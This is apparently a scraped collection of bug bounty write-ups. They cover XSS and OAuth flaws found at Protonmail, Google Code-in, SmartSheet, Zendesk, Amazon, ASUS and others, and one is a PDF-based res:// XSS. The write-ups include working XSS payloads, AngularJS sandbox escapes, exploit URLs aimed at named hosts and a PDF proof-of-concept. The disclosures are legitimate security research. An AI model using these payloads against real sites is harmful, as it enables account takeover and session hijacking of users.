on the name of file being uploaded. So a file name like {{constructor.constructor(‘alert(1)’)()}}.jpg will result in XSS on the uploaded files dashboard. Cool! But it’s Self XSS . There’s an easy way i found to make it Stored XSS on other users just by sharing the link to file and the file get’s imported in there uploaded files dashboard with the name unchanged, thus resulting in Stored XSS but i’ll show you one more interesting way i found to do this. In settings, i found a feature to import your files from DropBox. To do that, you need to connect the application to your Dropbox account using OAuth. I’ll quickly explain the OAuth flow of this application. So first, user clicks on connect Dropbox button and a GET request is initiated like this ( https://dropbox.com/oauth2/authorize?client_id=***********&response_type=code&state=****************&redirect_uri=https%3A%2F%2Fwww.redacted.com%2Faccount%2Fsettings%2Fdropbox-callback ). Then user is redirected to Dropbox, logins and click on Allow. 3. Just after clicking Allow, a GET Request containing the state parameter and auth_code is being sent to redacted.com as can be seen in Location header below. Press enter or click to view image in full size 4. As soon as this GET Request is executed on redacted.com, Dropbox get’s synced with current user session and all files from it can be imported to redacted.com. So i started testing this OAuth flow. The goal was to somehow connect my Dropbox account to other redacted.com users but found that everything is in place. The redirect_uri was perfectly whitelisted, state parameter was there as well, can’t use the auth_code twice etc. But still i tested the state parameter that whether the application was verifying it with current user session and found that it was verifying. So, I can’t use the final URL coming from Dropbox ( https://www.redacted.com/account/settings/dropbox-callback?state=********code=********** ) on other redacted.com users account. Than what’s WRONG? Out of curiosity i removed the state parameter from URL( https://www.redacted.com/account/settings/dropbox-callback?code=********** ) and used it in different user account and surprisingly, my Dropbox account was connected to that user. So basically i can connect my Dropbox account with anyone’s redacted.com account with just a GET request. But you might be wondering, what good is that? There wasn’t any option to login to redacted.com using Dropbox account so account takeover is not possible using it. But since i knew there’s already a XSS in file name, i took advantage of this OAuth misconfig. EXPLOIT SCENARIO Uploaded a file with name {{constructor.constructor(‘alert(1)’)()}}.jpg on Dropbox(strangely it was allowed). Give the final OAuth URL without state parameter from Dropbox to victim ( https://www.redacted.com/account/settings/dropbox-callback?code=********** ) Victim’s gets connected to our Dropbox account and imports all the files from Dropbox including the malicious file. When user visits Uploaded File Dashboard, our XSS payload in file name will be executed So although the server was verifying the state parameter with current user session, but it wasn’t verifying the presence of it. We can assume the server logic to be something like : if(isset($_GET['state'])){ if($_GET['state'] != current_user_state) ACCESS DENIED exit() } ACCESS GRANTED T hat’s it, a tricky way to bypass OAuth implementation and achieving stored XSS in an interesting way. TIMELINE Jan 1,2019 — Report Submitted Jan 2, 2019 — Triaged Jan 8, 2019 — Resolved Jan 15,2019 — Rewarded If you found this post useful in any way, make it useful for others as well by sharing. More coming. Get Your Applications Tested Today at DefCore Security Oauth Bug Bounty Security Infosec -- -- 2 Written by Rohan Aggarwal 444 followers · 1 following AppSec | BugBounty | Speaker | Game Hacking | Founder at Defcore Security Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@ChandSingh/protonmail-xss-stored-b733031ac3b5", "title": "Protonmail XSS — Stored. Hello Everyone, | by Chand Singh | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@ChandSingh/protonmail-xss-stored-b733031ac3b5. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nProtonmail XSS — Stored. Hello Everyone, | by Chand Singh | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Mastodon Protonmail XSS — Stored Chand Singh 2 min read · Jan 29, 2019 -- Listen Share Hello Everyone, It’s my first blog post related to my bug bounty work so many people are sharing there findings so I’m also try to write something. I’m not professional in writing these type of stuff so there are many mistakes you can see in this post, so without waisting your time to read my bad english , i would like to share my finding’s. It’s Series of Vulnerability which i found in the Protonmail Web app and also IOS app, and only publishing two now related to Protonmail. #1 Vulnerability Brute Force Attack on 10 Digit Code to Hijack any User Account I searched on internet for bug bounty website’s and i found Protonmail, before that i have not heard about that email service name. So i try , what i can do with protonmail. I just signed-up the service and checking there password reset functionality related to IDOR attacks but nothing found but i notice that they are sending the 10 Digit code to reset the password ! Proof of Concept for Brute force attack : Protonmail (1) #2 Vulnerability Stored XSS in Email Inbox It was interesting finding one of mine in the email service which is Stored XSS in protonmail, and it’s very easy to exploit to another user just by sending the email. Steps to Reproduce the issue : From Attacker Account : Compose a email to any protonmaail user with Subject #”><img src=x onerror=prompt(1);> 2. Send email to victim From Victim Account : 3. open email message from victim email click on reply 4. XSS executed ! :) Proof of Concept : Press enter or click to view image in full size Protonmail XSS I found many other bugs in Protonmail and many other XSS and Recently XSS in IOS App . Soon i will write on this. Thanks for the Protonmail Team they fix these issue quickly and they are very responsible person and awarded the bounty according to there Program :) Thanks for Reading, Hope you liked it ! Security Bug Bounty Protonmail Hacking Penetration Testing -- -- Written by Chand Singh 145 followers · 5 following Ethical Hacker - Security Researcher No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@friendly_/xss-through-swf-file-4f04af7b0f59", "title": "XSS Through SWF file!. First off, I’d like to say thank you to… | by Friendly | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@friendly_/xss-through-swf-file-4f04af7b0f59. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS Through SWF file!. First off, I’d like to say thank you to… | by Friendly | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in XSS Through SWF file! Friendly 2 min read · Jan 18, 2019 -- 1 Listen Share First off, I’d like to say thank you to everyone who’s followed and helped me learn different target points and attacks for web testing. In this story, I will be telling how a flash file led me to an XSS — however, I will not be disclosing the website due to their privacy and respect. 😊 Let’s start. You will need an XSS swf. That XSS swf file can be obtained through: https://github.com/evilcos/xss.swf — download the file and then upload to the server you’re testing on for Bounty Hunting!! Once you see the file is on the server and doesn’t ask you to download/reflects on the server, that’s when you put your XSS code. Simply add ?js=alert(document.domain); at the end of your .swf and it should display the XSS. Screenshots: Press enter or click to view image in full size As you can see, the x.swf file stays on the server. Press enter or click to view image in full size Adding ?js=alert(document.domain); triggered my XSS. Time and date for payout: Mon, Oct 29, 2018 10:51 AM - XSS found and reported the same day. Wed, Oct 31, 2018, 9:56 AM - An investigation was done by their security team. Nov 19, 2018, 8:18 AM - Payout of $200 USD was sent to my PayPal. Thank you for all reading and hope this helps you in your quest for bounty hunting. 😎 If you have any questions or comments, feel free to message me on Twitter @Skeletorkeys Security Xss Bug Bounty -- -- 1 Written by Friendly 403 followers · 4 following I am Friendly. Your friendly mid-night exploiter. Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@parthshah14031998/how-i-stumbled-upon-a-stored-xss-my-first-bug-bounty-story-2793300d82bb", "title": "How I stumbled upon a Stored XSS(My first bug bounty story). | by Parth Shah | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@parthshah14031998/how-i-stumbled-upon-a-stored-xss-my-first-bug-bounty-story-2793300d82bb. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I stumbled upon a Stored XSS(My first bug bounty story). | by Parth Shah | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How I stumbled upon a Stored XSS(My first bug bounty story). Parth Shah 2 min read · Jan 4, 2019 -- 1 Listen Share Hello bug hunters,this is my first story so pardon my English. I found this bug a few months back.I am grateful to the community as I have learned every damn thing from the community.I found this bug in Edmodo as who doesn’t want a swag for showing off in front of friends :).So Lets start the story. So the first step was reading what others have found so I save my time not to find them and I realized most of the bugs were reported by them.I was a bit disappointed but I had decided to find a vulnerability.So I started visiting the website and inserting XSS payloads in almost any and every input field but nothing popped up,checked for csrf,idor but all of them failed I was like It was late at night I thought of quitting and going to sleep I decided to test for last functionality of adding students in a group created by teacher.So i added XSS payload in first name and last name of the student and added it.As usual nothing happened.I was frustrated af.I decided to delete my account and everything and quit the target.So I started from deleting the student created from XSS Payload and BAAMMM! I got alert payload.I wasn’t able to believe I got my life’s first alert box. Press enter or click to view image in full size I was very happy as I got first valid bug of my life.I wasn’t able to sleep properly.I immediately made a POC video and sent to the team.They were very responsive.After few weeks I recieved the swag PS: This bug wasn’t intentional but the amount of hard work and time I put in the website made it worthy. Takeaways:- Always dig deeper in web application.There is always something fruitful. Always check each and every functionality and input. Main thing is never give up,I was going to give up and I found this. Thank you for reading this.Focusing now more on reward based programs.Any suggestions are welcome. Security Bug Bounty Infosec Web Security Xss Attack -- -- 1 Written by Parth Shah 41 followers · 7 following Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bugbountywriteup/cookie-based-self-xss-to-good-xss-d0d1ca16dd0e", "title": "410 post suspended — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/cookie-based-self-xss-to-good-xss-d0d1ca16dd0e. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 post suspended — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 This post is under investigation or was found in violation of the Medium Rules. There are thousands of stories to read on Medium. Visit our homepage to find one that’s right for you. Take me to Medium"}
{"source_url": "https://medium.com/@thejuskrishnan911/reflected-xss-on-asus-568ce0541171", "title": "Reflected XSS ON ASUS.. Hy this is Thejus Krishnan, This… | by Thejus Krishnan | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@thejuskrishnan911/reflected-xss-on-asus-568ce0541171. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nReflected XSS ON ASUS.. Hy this is Thejus Krishnan, This… | by Thejus Krishnan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Reflected XSS ON ASUS. Thejus Krishnan 1 min read · Jan 6, 2019 -- Listen Share Hy this is Thejus Krishnan, This article on my recent finding of ASUS Web Application Vulnerability which was affected by cross Site Scripting. Press enter or click to view image in full size When i was searching for an Asus product, i accidentally found out a sub domain https://press.asus.com . Url : https://press.asus.com/search?search= , Here i tried XSS. When i submitted the payload “dvs9c”><script>alert(‘hello’)</script>jnyf0\" in the search parameter. BOOM..! i got XSS. Vulnerable url : https://press.asus.com/search.php?search=Triodvs9c \"><script>alert(“hello”)</script>jnyf0 Press enter or click to view image in full size Few Weeks after reporting this issue to Asus Security Team. I got a replay from Asus Team that the issue has been resolved. Thanks for reading. Timeline : DEC 15 Reported the issue. DEC 17 Responded DEC 22 Fixed and HOF approved DEC 28 Listed in HOF Security -- -- Written by Thejus Krishnan 42 followers · 37 following Security Researcher | Web Pentester | Dev No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://websecblog.com/vulns/google-code-in-xss/", "title": "XSSing Google Code-in thanks to improperly escaped JSON data - Web Security Blog", "friendly_explanation": "This is a bug bounty writeup from https://websecblog.com/vulns/google-code-in-xss/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSSing Google Code-in thanks to improperly escaped JSON data - Web Security Blog Skip to content (Press Enter) Web Security Blog Thomas Orlita’s blog About Me About Me XSSing Google Code-in thanks to improperly escaped JSON data by Thomas Orlita Vulnerabilities December 14, 2018 February 16, 2022 Google Code-in is an online programming competition for students hosted by Google that takes place every year. When I was signing up for a second time, I put a payload into all the text fields. I didn’t expect anything to happen, but when I clicked the submit button, all the payloads were executed. And the payloads continued executing on every page I visited. This alone didn’t mean much as it would only classify as a self-XSS but meant that this didn’t have to be the only place the payload was improperly shown on the page. I submitted this bug to the support email and also to Google VRP in case it turns out to be a real issue. In Google Code-in you can submit tasks for review and also can add comments to them. And as usual, I put the payload in the comment. Surprisingly, when I added the comment, the payload worked once again. And it stayed there even after I reloaded the page. I sent an update to Google and they fixed it the following day. The Payload Now let’s take a look at what happened with the payload. They used script elements with type application/json generated on the backend to pass user data to the client-side. <script type=\"application/json\"> {\"someData\": true, \"text\": \"hello world\", \"user\": 123} </script> In the comment and other fields I used a simple payload like this: \"'><script src=x></script>{{1-1}} When a new comment is sent, it’s also added to the JSON object which holds the comments of a task as well as some other data. So when the comment was added, the JSON would look something like this: <script type=\"application/json\"> { \"someData\": true, \"comments\": [{ \"id\": 123, \"text\": \"\\\"'><script src=x></script>{{1-1}}\" }] } </script> As you can see, the double quote is escaped correctly and it’s a perfectly valid JSON. Except… they forgot to escape one important thing. Parsing Context As written in the HTML4 documentation : The first occurrence of the character sequence “</” (end-tag open delimiter) is treated as terminating the end of the element’s content. In valid documents, this would be the end tag for the element. This means as soon as the HTML parser sees </script> , it assumes it is the end of that element. We get even more info in the appendix of the documentation : When script or style data is the content of an element ( SCRIPT and STYLE ), the data begins immediately after the element start tag and ends at the first ETAGO (“</”) delimiter followed by a name start character ([a-zA-Z]); note that this may not be the element’s end tag. Authors should therefore escape “</” within the content. How to prevent this from happening, from the chapter Restrictions for contents of script elements : The easiest and safest way to avoid the rather strange restrictions described in this section is to always escape “ <!-- ” as “ <\\!-- “, “ <script ” as “ <\\script “, and “ </script ” as “ <\\/script ” when these sequences appear in literals in scripts (e.g. in strings, regular expressions, or comments), and to avoid writing code that uses such constructs in expressions. Doing so avoids the pitfalls that the restrictions in this section are prone to triggering: namely, that, for historical reasons, parsing of script blocks in HTML is a strange and exotic practice that acts unintuitively in the face of these sequences. This still wouldn’t be enough to get a working XSS on the page ( in modern browsers ) since they have a Content Security Policy set up. I wrote about bypassing CSP in a separate article . In a nutshell, CSP allows you to whitelist allowed sources of scripts, styles, and other resources to mitigate XSS attacks. This means a <script> element just like that wouldn’t be able to get through CSP and therefore wouldn’t be executed. Fortunately, Google Code-in uses AngularJS on its frontend. This means CSP can be easily bypassed. Expressions such as {{1-1}} get easily evaluated (see Angular XSS on McDonalds.com ). Since AngularJS 1.6, Google removed the expression sandbox completely, which means we can access the document with no problem just like this: {{constructor.constructor('alert(\"xss\")')()}} Now we have a working payload that gets executed every time someone (in this case mentors or site admins) opens the comments page. Timeline 2018-10-30 Vulnerability reported 2018-10-31 Fixed (by the dev team) 2018-11-01 Closed 2018-11-21 Reopened and accepted 2018-11-21 Priority changed to P2 2018-12-11 Reward issued 2018-12-12 Marked as fixed Written by Thomas Orlita Follow me on Twitter: @ThomasOrlita / Mastodon: @ThomasOrlita@infosec.exchange Post Navigation Previuos Article Previous Article: Bypassing Firebase authorization to create custom app.goo.gl subdomains Next Article Unsecured access to personal data of a million Leo Express users Related Articles XSSing Google Employees — Blind XSS on googleplex.com by Thomas Orlita in Vulnerabilities Listing all registered email addresses on Google’s Crisis Map thanks to IDOR and incremental IDs by Thomas Orlita in Vulnerabilities Unsecured access to personal data of a million Leo Express users by Thomas Orlita in Vulnerabilities Reflected XSS in Google Code Jam by Thomas Orlita in Vulnerabilities Leave a Reply Cancel reply You must be logged in to post a comment. Web Security Blog by Thomas Orlita Digital Download | Developed by Rara Theme . Powered by WordPress ."}
{"source_url": "https://medium.com/@hariharan21/stored-xss-via-alternate-text-at-zendesk-support-8bfee68413e4", "title": "Stored XSS Via Alternate Text At Zendesk Support | by Hariharan S | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@hariharan21/stored-xss-via-alternate-text-at-zendesk-support-8bfee68413e4. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStored XSS Via Alternate Text At Zendesk Support | by Hariharan S | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Stored XSS Via Alternate Text At Zendesk Support Hariharan S 3 min read · Jan 6, 2019 -- 1 Listen Share Hi Guys, Finding bugs nowadays is like finding a needle in an haystack, But i was lucky enough to get that needle. Well…The story begins just like every bug hunter’s daily routine.. Just a normal day in search for any bug that i could get my hands on. But no luck..Now they usual thought came in “ Time to jump to the next program ” and i jumped and landed straight on a program called ZENDESK .. Now i had to find what does this website do🤔🤔…It took me about 20 minutes to understand that it was actually a Support desk providing site for other websites.. Ok Now to Initialise the hunt.. Tempmail..Account Create..Bla Bla, And Logged on to my account. Hmmm….What next!! Of course time to test for xss Basically all i did was just inserting payloads on all the input fields i could get my hands on. This is when i came across a rich text editor but it did not have any much function just like normal text editors. In it i found a URL input field and what’s funny about this field is that it does not actually detect if the given input is a URL. So i put my favorite XSS payload “ Love Img XSS Payload ” in the url input field and click ok. But Nothing…. But…Apart from the url input field there was a ALTERNATIVE TEXT for the url. So i tested my luck on that…gave a random url and dropped the XSS payload on the ALTERNATIVE TEXT and clicked on ok. I Click on the Link and BOOM!! Got XSSed…. Report Timeline : Jul 23rd- Report Submitted Jul 24th- Report Triagged Aug 23rd- Bounty Time$$$ Sep 12th- Resolved and Got listed on thier HOF And That's How a Alternative Text Executed a XSS …As it Goes. So Adios Amigos…That's all 4 now..This is Hariharan Signing Off.. Bug Bounty Hacking -- -- 1 Written by Hariharan S 95 followers · 0 following In my experience, there’s no such thing as luck. Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@rohanchavan/a-unique-xss-scenario-1000-bounty-347f8f92fcc6", "title": "A Unique XSS Scenario in SmartSheet || $1000 bounty. | by Rohan Chavan | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@rohanchavan/a-unique-xss-scenario-1000-bounty-347f8f92fcc6. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nA Unique XSS Scenario in SmartSheet || $1000 bounty. | by Rohan Chavan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in A Unique XSS Scenario in SmartSheet || $1000 bounty. Just another XSS POC writeup ..!!! Rohan Chavan 6 min read · Feb 3, 2019 -- 2 Listen Share TLDR: This is an writeup of a recent bug which I found in smartsheet .It was an stored xss , but the way it was getting triggered was really great from the perspective for hackers, js was getting executed when any user clicks on the malicious notification , this could let any user takeover any account (with vertical and horizontal privileges ) which increased the severity of the Bug.The security team of the program was very professional and understood the scenario very well. Before we move forward, I’d really like to thank the smartsheet security team for this coordinated disclosure. Hello guyzz .!!! Thanks for your support and blessings.I hope you all are doing fine and are excited to read about this writeup because of the click-bait Title. So without wasting any time further, lets get straight into it. Its only been 2–3 months since I started bug-bounty.Before that I used to spend most of my time on hackthebox.eu and play CTFs ,back then I had tried bugbounty but I wasnt getting anything , after getting a -ve signal on my H1 profile because of NA’s , I got frustrated/depressed and left that track. (One of the Biggest mistake I ever did) From the last two month I decided to give 3 hours a day to bugbounty because I wanted to give oscp and didn’t wanted to put that burden on my parents back (P.S I am a student and not yet working).So the only option I was seeing to earn that money for my OSCP fees was BugBounty. And it worked out ..!!! I started with Points only programs in bugcrowd (Yeah I love bugcrowd, already had a bad experience with h1) because professional hunters don’t hunt for points.I was also testing wordpress plugins, most of them are Damn Buggy. Last month I reported around 5 bugs but this was the scenario. report’s stats But then I got my first bounty from ZOHO, ( I have provided a link to it at the end of this writeup ) .Then I saw smartsheet in the bugcrowd programs directory, Press enter or click to view image in full size It has a very catchy tagline which intimate any hacker/researcher to test their skills on the program. I was like ..!! Challenge Accepted ..!! I then read the program rules and scope, I saw a lot of researchers in recently joined (more than 500) as it was an old program, which makes it even tough. But I wanted to test myself. It was around 5pm when I started basic recon, started a nmap full port scan (this is the habit of all the HTB dudes, everything starts with NMAP …hahaha). Since it was going to take a while, i decided to signup and see what it actually is, because till that moment I had never came across that platform. I signed up and started wandering here and there, trying what all privilages do a normal user have. In that program a user is able to make a sheet somewhat similiar to Ms. Excel ( Go signup and check them out ..!!! ). we could give access of that sheet to various users of that program to manage the sheet, suppose I am tester , and I could give access to other person suppose victim1 , It is a cool feature isnt it ? but wait ..!!! whenever tester makes any change in the document, victim1 could be notified about it. (This is the main attack scenario, have written in brief about it further.) So I spent next few hours trying a lot of things like IDOR, sqli, also xss’s but since it was an old program mostly all the user inputs were properly sanitized and handled. It was really testing me. I started at 5pm and it was 9 pm now, I had dinner and started again at 9:30. But I had decided to not give up easily on it, like i used to do earlier.I motivated myself and got mentally prepared to spend next 2–3 days on it.Now I started fuzzing their api, and left it to run and got back to the main webapp. I was manually going through each and every request and response had lots of repeater tabs open , things started getting messy. It was now 11 pm, I plugged in my earphones psy-trance was playing and I was in the Trip of hacking. It popped my mind that I haven’t tried SSRF yet, and saw that I can attach link through attachment’s. I linked scanme.nmap.org:22 and in the link name parameter I entered the payload “><img src=x onerror=”alert(1)”> .But this time I enabled the notifications, and attached the link to the document.After a minute I saw the notification appeared. I clicked on the notification and saw that the html content after clicking on notification got a bit misplaced because of the above payload. Then I saw the markup near the link name parameter. and modified the payload as “>”><img src=x onerror=”alert(1)”> and attached the link. XSS payload Attached the link , nothing happened on the sheet. I continued to look for other things, After a few minutes I got the notification that attachment has been added to the document. Notification When I clicked on that notification XSS got executed ..!!! Press enter or click to view image in full size XSS triggered ..!!! So we now have an XSS, but how can I increase the impact !!! If you have read above , there is a feature in smartsheet which would allow you to notify/alert other users, what if another user suppose victim ,gets the malicious notification and he clicks on it ?? Yes then he will be truly a victim of the attack.It could be an account takeover. If attacker attaches an malicious attachment, and the true owner of that page clicks on the notification, his account would be compromised. We have an Account Takeover ..!!! Until this It was around 12.30 pm. I wrote a nice report and made a video POC and submitted the report on bugcrowd. I did it ..!!! Report Time Line : Submitted report on Bugcrowd — 3 October 2018 19:21:24 UTC. Requested more info — 5 October 2018. Info Provided — 6 October 2018. Report Triaged — 10 October 2018. Awarded 20 points and $1000–12 October 2018 Requested for disclosure — 12 October 2018. Status changed to Resolved — 16 October 2018. Agreed for coordinated disclosure — 16 October 2018. Write up published — 3 February 2019. Thanks for reading ..!!! I am looking for an opportunity in infosec (mostly an Internship, or part time jobs). I am good in Web Application security , also am a certified php developer and python enthusiast. I have written some hacking tools and other cool stuff. So if You hire for your company I would like to apply (Remote or in Mumbai). You can find me here https://p5yph3r.github.io/ Some of my other writeups :- My Writeup on Zoho Bug ..!!! $100 Bounty in 300 seconds isn’t bad !!! Hey guyzz …!!! I hope you are fine and doing absolutely awesome in your own fields. Thanks for the awesome response on… medium.com Social Engineering — because there is no patch for Human Stupidity ..!!! Before God we are all equally wise — and equally foolish. medium.com Writing A Simple Directory Bruteforcing Tool with 25 Lines of Python It was a boring friday noon, I was in my college having DSP (Digital Signal Processing) practicals, it was actally a… www.secjuice.com Security Hacking Bug Bounty Xss Attack Infosec -- -- 2 Written by Rohan Chavan 562 followers · 68 following Python Full Stack Dev | GO | Security Enthusiast | Bug Bounty | Automation Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@newp_th/reflected-xss-on-ws-na-amazon-adsystem-com-amazon-f1e55f1d24cf", "title": "Reflected XSS on ws-na.amazon-adsystem.com(Amazon) | by newp_th | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@newp_th/reflected-xss-on-ws-na-amazon-adsystem-com-amazon-f1e55f1d24cf. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nReflected XSS on ws-na.amazon-adsystem.com(Amazon) | by newp_th | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Reflected XSS on ws-na.amazon-adsystem.com(Amazon) newp_th 1 min read · Dec 27, 2018 -- 2 Listen Share This is newp_th . This issue is very similar to my previous report on Reflected XSS on Stack Overflow . It was much easier than before, Just append a malicious payload “><script/k/>alert(113)</script/k/> to parameter. https://ws-na.amazon-adsystem.com/widgets/q?ServiceVersion=20070822&OneJS=1&Operation=GetAdHtml&MarketPlace=US&source=ss&ref=as_ss_li_til&ad_type=product_link&tracking_id=jgsbookselection%22%3E%3Cscript/k/%3Ealert(113)%3C/script/k/%3E&marketplace=amazon&region=US&placement=1449319432&asins=1449319432&linkId=cc38d5883c3f92bbeb69b93a6810322a&show_border=true&link_opens_in_new_window=true Press enter or click to view image in full size Few weeks after reporting this issue to amazon security team, I got a reply that issue has been resolved and to verify it again. On further testing I could easily bypass the fix using payload “-confirm(1)-”. https://ws-na.amazon-adsystem.com/widgets/q?ServiceVersion=20070822&OneJS=1&Operation=GetAdHtml&MarketPlace=US&source=ss&ref=as_ss_li_til&ad_type=product_link&tracking_id=1%22-confirm(1)-%22&marketplace=amazon&region=US&placement=1449319432&asins=1449319432&linkId=cc38d5883c3f92bbeb69b93a6810322a&show_border=true&link_opens_in_new_window=true# Press enter or click to view image in full size Thanks for reading. Hope will get time to write some more posts. Timeline: 29-May-2018: Bug reported 29-May-2018: Bug confirmed by security team 25-June-2018: Bug Fixed 27-June-2018: Bypassed Fix 12-Dec-2018: Bug Resolved Security Xss Attack Amazon Penetration Testing -- -- 2 Written by newp_th 321 followers · 269 following secure your computer 😊 Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@80vul/from-http-domain-to-res-domain-xss-by-using-ie-adobes-pdf-activex-plugin-9f2a72a87aff", "title": "From http:// domain to res:// domain xss by using IE Adobe’s PDF ActiveX plugin | by heige | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@80vul/from-http-domain-to-res-domain-xss-by-using-ie-adobes-pdf-activex-plugin-9f2a72a87aff. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nFrom http:// domain to res:// domain xss by using IE Adobe’s PDF ActiveX plugin | by heige | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in From http:// domain to res:// domain xss by using IE Adobe’s PDF ActiveX plugin heige 2 min read · Mar 19, 2019 -- Listen Share by Heige(a.k.a Superhei) of KnownSec 404 Team 03/19/2019 [Article release: https://paper.seebug.org/860/ ] 1 res://apds.dll/redirect.html dom xss https://bugs.chromium.org/p/project-zero/issues/detail?id=1598&desc=5 had reported an xss vulnerability in res://apds.dll/redirect.html. And this vulnerability has not been fixed until now. this vulnerability is a typical dom xss vulnerability form the res://apds.dll/redirect.html code: <!DOCTYPE html> <html xmlns=” http://www.w3.org/1999/xhtml \" > <head> <meta http-equiv=”Content-Type” content=”text/html; charset=utf-8\"/> <script type=”text/javascript”> var targetParamRegex = /[\\?\\&]target=([^\\&\\#]+)/i; var targetResults = targetParamRegex.exec(window.location.search); if (targetResults) { window.location.replace(decodeURIComponent(targetResults[1])); } </script> </head> <body> </body> </html> POC: res://apds.dll/redirect.html?target=javascript:alert(1) 2 from http:// domain to res:// domain Usually accessing res:// resources via http:// domain is not allowed. The Javascript function xfa.host.gotoURL() in Adobe PDF can access multiple URLs include http(s):// file:// etc. Of course, in general, there will be security tips when you open the PDF files. But when we use xfa.host.gotoURL() to access res:// or http(s):// by IE Adobe’s PDF ActiveX plugin : xfa.host.gotoURL(“res://apds.dll/redirect.html?target=javascript:alert(1);//”); there are no security alerts. and the xss payload “alert(1)” is executed. POC: http://xxxxxxx/r.pdf r.pdf code: %PDF-1.4 1 0 obj <<>> %endobj 2 0 obj <<>> stream <xdp:xdp xmlns:xdp=” http://ns.adobe.com/xdp/ \"> <config><present><pdf> <interactive>1</interactive> </pdf></present></config> <template> <subform name=”a”> <pageSet/> </subform> </template> </xdp:xdp> endstream endobj trailer << /Root << /Pages <<>> /AcroForm << /XFA 2 0 R >> /OpenAction << /S/JavaScript /JS( xfa.host.gotoURL(“res://apds.dll/redirect.html?target=javascript:alert(1);//”); ) >> >> >> demo tweet https://twitter.com/80vul/status/1048576146835558400 3 fixed? Due to some security domain isolation of IE, the harm of res:// domain xss is limited. But I think Microsoft should actively fix the res://apds.dll/redirect.html xss vulnerability, and Adobe should disable or give corresponding security warnings when URL redirect,The world can be more beautiful and harmonious! 4 Timeline October 04, 2018 Report it to Adobe PSIRT and MSRC October 05, 2018 Adobe tracking number PSIRT-8981. October 09, 2018 MSRC Case 47932 CRM:0461065793 October 18, 2018 Adobe PSIRT has been investigating and still November 21, 2018 MSRC have completed our investigation and determined that the case doesn’t meet the bar for immediate servicing in a security update. March 19, 2019 Public October 15,2019 Adobe fix it in the APSB19–49 (CVE-2019–8160) https://helpx.adobe.com/security/products/acrobat/apsb19-49.html JavaScript Xss Attack Knownsec -- -- Written by heige 207 followers · 20 following The Leader of the KnownSec 404 Team ( ZoomEye http://www.zoomeye.org SeeBug http://www.seebug.org KCon http://kcon.knownsec.com ) No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@sudhanshur705/reflected-xss-in-zomato-f892d6887147", "title": "Reflected XSS in Zomato. Heyy Everyonee, | by Sudhanshu Rajbhar | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@sudhanshur705/reflected-xss-in-zomato-f892d6887147. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nReflected XSS in Zomato. Heyy Everyonee, | by Sudhanshu Rajbhar | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Reflected XSS in Zomato Sudhanshu Rajbhar 4 min read · Jan 21, 2019 -- 6 Listen Share Heyy Everyonee, In this writeup I am going to tell you how I was able to get xss in Zomato. I will tell the whole story how I found the vulnerable parameter. Actually at that time I was reading a book “Mastering Modern Web Penetration Testing” (You can get it on Amazon) and from there I got know about a website named wolframalpha which we can use for subdomain enumeration. I just thought of giving it a try , so I enetered zomato.com in the search bar and it gave me around 10 subdomains.It also shows “daily visitors” of a particular subdomain, thats a great options if you are looking for a less visited areas.So the last domain from the list caught my attention as the visitors were very less compared to others. Source: https://www.wolframalpha.com/input/?i=zomato.com I opened secretx.zomato.com, and all I can see is a button -“sign in with Zomato”.I checked the source code , nothing ineteresting. I clicked on the button, it redirected me to zomato.com and a box was there saying “SecretX Client wants to access you Zomato Account. Accept or Recject” . So I again went back to the website.From the source code I took out this url https://auth2.zomato.com/oauth2/auth?response_type=code&client_id=80b39918-90be-49d2-ac52-4a8b1a25bcf1&redirect_uri=https%3A%2F%2Fsecretx.zomato.com%2Fuser%2Foauth2%2Fredirect_uri&state=2BHoBnVFFKP29L6SerHgEb7OCnBDPO which was getting load when the button was clicked. Here I added some junk values to the parameters to check for any oauth misconfiguration.And 